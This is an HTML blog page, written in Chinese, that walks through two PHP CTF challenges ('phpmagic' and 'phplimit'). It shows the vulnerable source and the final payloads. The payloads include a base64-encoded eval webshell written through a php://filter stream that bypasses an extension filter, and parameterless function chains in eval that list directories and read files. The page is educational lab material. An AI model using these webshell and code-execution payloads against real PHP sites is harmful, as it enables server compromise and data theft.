@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="参考文献：https://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/http://f1sh.site/2018/11/25/code-breaking-puzzles%e5%81%9a%e9%a2%98%e8%ae%b0%e5%bd%95/递归匹配：http://www.laruence.com/2011/09/30/2179.html easy -">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="p神代码审计知识星球二周年wp[2]">
+<meta property="og:url" content="https://cws6.github.io/2018/12/03/p神-代码审计知识星球二周年wp[2]/index.html">
+<meta property="og:site_name" content="cws6">
+<meta property="og:description" content="参考文献：https://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/http://f1sh.site/2018/11/25/code-breaking-puzzles%e5%81%9a%e9%a2%98%e8%ae%b0%e5%bd%95/递归匹配：http://www.laruence.com/2011/09/30/2179.html easy -">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-65df0fd43f67de53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-933136f77bcc7330.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-e95fbc79f1bac966.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-6363db1a84f7e830.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-3e1fabda08b09ac0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-03T01:31:57.948Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="p神代码审计知识星球二周年wp[2]">
+<meta name="twitter:description" content="参考文献：https://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/http://f1sh.site/2018/11/25/code-breaking-puzzles%e5%81%9a%e9%a2%98%e8%ae%b0%e5%bd%95/递归匹配：http://www.laruence.com/2011/09/30/2179.html easy -">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-65df0fd43f67de53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+
+
+
+  <link rel="canonical" href="https://cws6.github.io/2018/12/03/p神-代码审计知识星球二周年wp[2]/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>p神代码审计知识星球二周年wp[2] | cws6</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cws6</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">空巢老人</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/12/03/p神-代码审计知识星球二周年wp[2]/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cws6">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cws6">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">p神代码审计知识星球二周年wp[2]
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-12-03 09:07:50 / Modified: 09:31:57" itemprop="dateCreated datePublished" datetime="2018-12-03T09:07:50+08:00">2018-12-03</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>参考文献：<a href="https://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/" target="_blank" rel="noopener">https://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/</a><br><a href="http://f1sh.site/2018/11/25/code-breaking-puzzles%e5%81%9a%e9%a2%98%e8%ae%b0%e5%bd%95/" target="_blank" rel="noopener">http://f1sh.site/2018/11/25/code-breaking-puzzles%e5%81%9a%e9%a2%98%e8%ae%b0%e5%bd%95/</a><br>递归匹配：<a href="http://www.laruence.com/2011/09/30/2179.html" target="_blank" rel="noopener">http://www.laruence.com/2011/09/30/2179.html</a></p>
+<h4 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h4><p><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&apos;read-source&apos;])) &#123;</span><br><span class="line">    exit(show_source(__FILE__));</span><br><span class="line">&#125;</span><br><span class="line">define(&apos;DATA_DIR&apos;, dirname(__FILE__) . &apos;/data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]));</span><br><span class="line">if(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, 0755, true);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line">$domain = isset($_POST[&apos;domain&apos;]) ? $_POST[&apos;domain&apos;] : &apos;&apos;;</span><br><span class="line">$log_name = isset($_POST[&apos;log&apos;]) ? $_POST[&apos;log&apos;] : date(&apos;-Y-m-d&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;!-- Required meta tags --&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;</span><br><span class="line">    &lt;!-- Bootstrap CSS --&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css&quot; integrity=&quot;sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE=&quot; crossorigin=&quot;anonymous&quot;&gt;</span><br><span class="line">    &lt;title&gt;Domain Detail&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    pre &#123;</span><br><span class="line">        width: 100%;</span><br><span class="line">        background-color: #f6f8fa;</span><br><span class="line">        border-radius: 3px;</span><br><span class="line">        font-size: 85%;</span><br><span class="line">        line-height: 1.45;</span><br><span class="line">        overflow: auto;</span><br><span class="line">        padding: 16px;</span><br><span class="line">        border: 1px solid #ced4da;</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;col&quot;&gt;</span><br><span class="line">            &lt;form method=&quot;post&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;input-group mt-3&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;input-group-prepend&quot;&gt;</span><br><span class="line">                        &lt;span class=&quot;input-group-text&quot; id=&quot;basic-addon1&quot;&gt;dig -t A -q&lt;/span&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;input type=&quot;text&quot; name=&quot;domain&quot; class=&quot;form-control&quot; placeholder=&quot;Your domain&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;input-group-append&quot;&gt;</span><br><span class="line">                        &lt;button class=&quot;btn btn-outline-secondary&quot; type=&quot;submit&quot;&gt;执行&lt;/button&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;col&quot;&gt;</span><br><span class="line">            &lt;pre class=&quot;mt-3&quot;&gt;&lt;?php if(!empty($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(&quot;dig -t A -q %s&quot;, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">                $log_name = $_SERVER[&apos;SERVER_NAME&apos;] . $log_name;</span><br><span class="line">                if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;], true)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line">                echo $output;</span><br><span class="line">            endif; ?&gt;&lt;/pre&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong>解题思路</strong><br>能控制文件名和文件内容，但是文件内容被<code>htmlspecialchars函数</code>过滤了一次，尖括号没了。PHP的一个特点：只要是传<code>filename</code>的地方，基本都可以传<code>协议流</code>。而<code>file_put_contents</code>的第一个参数就是传<code>filename</code>的地方<br><strong>一个简单的栗子</strong><br><img src="https://upload-images.jianshu.io/upload_images/5035860-65df0fd43f67de53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><em>利用php伪协议流解码base64写入webshell</em><br><strong>其他问题</strong></p>
+<ul>
+<li>后缀名将能解析php文件的全禁止了</li>
+<li><code>$log_name</code>之前会加上<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>，不完全可控文件名</li>
+<li>文件内容也不完全可控</li>
+</ul>
+<p><strong>解决方法</strong></p>
+<ul>
+<li>一个可以在windows和linux上都行得通的方法：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=1.php/.&amp;content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>在操作系统中，都是禁止使用<code>/</code>作为文件名的，但是后面加一个<code>.</code>就可以成功的写入<code>1.php</code>了。pathinfo就取不到后缀名，可以正常写入<code>.php</code>之中。且无论是在windows上还是linux上，每次都只可以创建新文件，不能覆盖老文件</p>
+<ul>
+<li><code>$_SERVER[&#39;SERVER_NAME&#39;]</code>取的是HTTP headers中的<code>Host</code>的值。<code>md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code>是自己本机外网ip的md5值<br><img src="https://upload-images.jianshu.io/upload_images/5035860-933136f77bcc7330.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/5035860-e95fbc79f1bac966.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+</ul>
+<p><strong>最终payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domain=PD9waHAgZXZhbCgkX1BPU1RbMTJdKTs/Pg&amp;log=://filter/write=convert.base64-decode/resource=6.php/.</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>在p神的环境上可以直接成功。但是在本机上测试的时候，写入的文件一直是乱码，后来经大佬提醒才知道还需填充字符串。(左边是p神的环境，右边是自己的)<br><img src="https://upload-images.jianshu.io/upload_images/5035860-6363db1a84f7e830.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><strong>在自己本机上的payload</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domain=aaaPD9waHAgZXZhbCgkX1BPU1RbMTJdKTs/Pg&amp;log=://filter/write=convert.base64-decode/resource=8.php/.</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h4><p><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123;    </span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>解题思路</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\W：任意个非单词字符。匹配非字母、数字、下划线。等价于 `[^A-Za-z0-9_]`</span><br><span class="line">?: 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?</span><br><span class="line">\((?R)?\)：(?R)*表示, 正则式本身, 可以认为是:`(正则本身(正则本身).....)`。</span><br></pre></td></tr></table></figure></p>
+<p><em>那么此题最终的正则匹配就是可以递归执行函数，不可以带参数。</em><br><strong>php函数</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getcwd ()：取得当前工作目录</span><br><span class="line">dirname()：给出一个包含有指向一个文件的全路径的字符串，本函数返回去掉文件名后的目录名。</span><br><span class="line">chdir()：改变当前的目录。</span><br><span class="line">scandir(directory)：返回一个 array，包含有 `directory` 中的文件和目录</span><br><span class="line">readdir ()：返回目录中下一个文件的文件名。文件名以在文件系统中的排序返回</span><br><span class="line">array_reverse() ：接受数组 array 作为输入并返回一个单元为相反顺序的新数组</span><br><span class="line">next()：它返回的是下一个数组单元的值并将数组指针向前移动了一位。</span><br><span class="line">get_defined_vars ()：返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。 </span><br><span class="line">reset()：将 array 的内部指针倒回到第一个单元并返回第一个数组单元的值。</span><br></pre></td></tr></table></figure></p>
+<p><strong>不带参数的一些函数组合</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?code=print(phpinfo());</span><br><span class="line">?code=print(readdir(opendir(getcwd())));                  #列目录</span><br><span class="line">?code=print(readfile(readdir(opendir(getcwd()))));         #读文件</span><br><span class="line">?code=print(dirname(dirname(getcwd())));      #print出/var</span><br><span class="line">?code=eval(implode(getallheaders()));    #apache模块的函数</span><br><span class="line">?code=eval(implode(get_defined_vars()));</span><br></pre></td></tr></table></figure></p>
+<p><strong>最终payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=readfile(implode(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); #查看当前文件夹</span><br><span class="line">?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></p>
+<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=readfile(&quot;../flag_phpbyp4ss&quot;);//&amp;code=eval(implode(reset(get_defined_vars())))</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-3e1fabda08b09ac0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+    <div>
+    
+       <div>
+
+    <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+
+</div>
+    
+    </div>
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/02/p神代码审计知识星球二周年wp-1/" rel="next" title="p神代码审计知识星球二周年wp[1]">
+                <i class="fa fa-chevron-left"></i> p神代码审计知识星球二周年wp[1]
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cws6</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#easy-phpmagic"><span class="nav-number">1.</span> <span class="nav-text">easy - phpmagic</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#easy-phplimit"><span class="nav-number">2.</span> <span class="nav-text">easy - phplimit</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cws6</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!-- 
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
